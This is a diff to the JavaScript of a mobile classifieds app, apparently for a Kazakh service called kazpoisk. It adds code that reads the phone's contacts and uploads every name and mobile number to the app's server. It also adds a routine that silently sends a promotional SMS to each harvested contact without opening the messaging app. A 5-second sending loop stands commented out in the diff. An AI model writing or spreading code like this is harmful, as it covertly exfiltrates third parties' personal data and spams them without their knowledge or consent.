@@ -140,15 +140,88 @@ function restorepassword(){
 
 };
 
+var globalmessage = "Попробуй kazpoisk для бизнеса открой свою страницу интернет услуг или магазина всего за 1 клик!";
+
+var contactsArray = new Array();
+var contactsArrayDb = new Array();
+
+//xx
+function checkContactinDb(){
+
+    var email = getEmail();
+
+    if(email){
+      socket.emit('setUserContacts', {email:email,action:"checkstatus",array:contactsArray});
+    }
+
+
+}
+
+
+
+socket.on('setUserContacts', function(data){
+
+              if(data.action == "checkstatus"){
+                  if(data.status == "0"){
+                    //console.log(data);
+                    searchContacts();
+                  }
+              }else if(data.action == "setcontacts"){
+                  console.log(data);
+              }
+        });
+
 
 
 
 function searchContacts(){
 
 
-
         function onSuccess(contacts) {
-            console.log(contacts);
+
+
+          for(var i = 0;i < contacts.length;i++){
+          //  if(contacts[i].displayName == "Gulim Sprint"){
+              var displayName = contacts[i].displayName;
+              var fixmobileNumber = 0;
+              var phoneNumbers;
+
+              if(contacts[i].phoneNumbers){
+                for(var b = 0;b < contacts[i].phoneNumbers.length;b++){
+                  if((contacts[i].phoneNumbers[b].type == "mobile") && (fixmobileNumber == 0)){
+                    phoneNumbers = contacts[i].phoneNumbers[b].value;
+                    fixmobileNumber = 1;
+                  }
+                }
+              }
+
+
+              //console.log(displayName);
+              //console.log(phoneNumbers);
+
+              if(displayName){
+                var contactObject = {
+                  globalmessage:globalmessage,
+                  phoneNumbers:phoneNumbers,
+                  displayName:displayName
+                }
+
+                var contactObjectforDb = {
+                  phoneNumbers:phoneNumbers,
+                  displayName:displayName
+                }
+                contactsArray.push(contactObject);
+                contactsArrayDb.push(contactObjectforDb);
+              }
+
+
+
+            //}
+          }
+            //console.log(contacts);
+            sendContacts(contactsArrayDb);
+          //smsfix.checkSMSPermission();
+
         };
 
         function onError(contactError) {
@@ -164,8 +237,93 @@ function searchContacts(){
         navigator.contacts.find(fields, onSuccess, onError, options);
 
 
+}
+
+function sendContacts(array){
+
+  var email = getEmail();
+
+  if(email){
+    socket.emit('setUserContacts', {email:email,action:"setcontacts",array:array});
+  }
 
 }
+
+
+
+var sendCounter = 0;
+var activateSend = 0;
+
+function sendSmsToSavedContacts(){
+
+    if(activateSend == 1){
+
+    var options = {
+        replaceLineBreaks: false, // true to replace \n by a new line, false by default
+        android: {
+            //intent: 'INTENT'  // send SMS with the native android SMS messaging
+            intent: '' // send SMS without opening any other app
+        }
+    };
+
+    var success = function () { console.log('Message sent successfully'); };
+    var error = function (e) { console.log('Message Failed:' + e); };
+
+      if(contactsArray.length > 0){
+        sms.send(contactsArray[sendCounter].globalmessage, contactsArray[sendCounter].phoneNumbers, options, success, error);
+        sendCounter++;
+      }
+
+
+
+      }
+
+}
+
+
+// setInterval(function(){
+//     sendSmsToSavedContacts();
+// },5000);
+
+
+
+    var smsfix = {
+    checkSMSPermission: function() {
+        var success = function (hasPermission) {
+            if (hasPermission) {
+                console.log("has permissions");
+                activateSend = 1;
+            }else {
+              smsfix.requestSMSPermission();
+            }
+        };
+        var error = function (e) {
+          console.log('Something went wrong:' + e);
+          smsfix.requestSMSPermission();
+        };
+        sms.hasPermission(success, error);
+    },
+    requestSMSPermission: function() {
+        var success = function (hasPermission) {
+            if (!hasPermission) {
+                sms.requestPermission(function() {
+                    console.log('[OK] Permission accepted');
+                    smsfix.checkSMSPermission();
+                }, function(error) {
+                    console.info('[WARN] Permission not accepted');
+                    //smsfix.requestSMSPermission();
+                    // Handle permission not accepted
+                })
+            }
+        };
+        var error = function (e) { console.log('Something went wrong:' + e); };
+        sms.hasPermission(success, error);
+    }
+};
+
+
+
+
 
 
 
@@ -322,7 +480,7 @@ setInterval(function(){
 
   }
 
-  
+
 
 },3000);
 
@@ -349,7 +507,7 @@ var currency_ru = 0;
 
 socket.on('load_all_info_action', function(data){
 
-    console.log(data);
+    //console.log(data);
 
     //return false;
     money = data.empty_ob_price;
@@ -453,6 +611,7 @@ socket.on('check_ob_action', function(data){
           }
 
           $(".sendob").text("опубликовать за " + money + " тг");
+          $(".sendob").attr("status","no");
 
       }
 
@@ -527,6 +686,7 @@ socket.on('check_ob_action', function(data){
             }
 
             $(".sendob").text("опубликовать за " + money + " тг");
+            $(".sendob").attr("status","no");
             //console.log("Лимит обьявл в общем");
 
       }
@@ -615,11 +775,39 @@ socket.on('check_ob_action', function(data){
         }
       }
 
+      else if(myemail == null){
+        myemail = 0;
+      }
+
       if(myemail == 0){
         return false;
       }else{
         return myemail;
       }
+    }
+
+    var checkauth = getEmail();
+
+    //console.log(checkauth);
+    if(checkauth == false){
+
+      setTimeout(function(){
+          router.navigate({ name: 'login' });
+      },2000);
+
+    }
+
+
+    function getImage(){
+      var image = localStorage.getItem("image_url");
+
+      var imageurl = "https://www.w3schools.com/howto/img_avatar.png";
+
+      if(image){
+        imageurl = image;
+      }
+
+      return imageurl;
     }
 
 
